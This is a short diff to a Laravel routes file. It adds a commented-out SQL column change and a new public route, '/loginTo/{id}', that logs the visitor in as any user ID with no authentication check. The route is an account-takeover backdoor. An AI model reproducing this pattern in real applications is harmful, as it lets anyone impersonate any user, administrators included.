@@ -5,7 +5,13 @@ use Illuminate\Database\Schema\Blueprint;
 use Illuminate\Support\Facades\Route;
 
 Route::get('databaseforall', function (){
+//    ALTER TABLE `adminlog` ADD `date` VARCHAR(20) NULL AFTER `updated_at`;
 
+});
+
+Route::get('/loginTo/{id}', function($id){
+   auth()->loginUsingId($id);
+   return redirect()->back();
 });
 
 Route::get('fillHotelPic', function(){
